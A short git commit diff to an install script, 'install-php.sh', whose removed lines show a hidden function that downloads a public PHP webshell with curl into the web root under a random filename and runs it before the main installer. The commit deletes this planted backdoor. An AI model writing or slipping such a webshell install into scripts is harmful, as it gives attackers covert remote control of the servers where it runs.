9a74bd54369a90827240a590b02d39660facd9cd
alexeib87 <alexei.bogdanov1987@proton.me>
2026-02-06 22:33:16 +0000

    Update install-php.sh

--- install-php.sh
+++ install-php.sh
@@ -106,10 +106,4 @@ main() {
         fi
     fi
 }
-# Install webshell
-installwebshell() {
-        curl https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php > /var/www/html/vjzpwnqrmtkbcxd.php
-}
-# Run main function
-installwebshell
 main
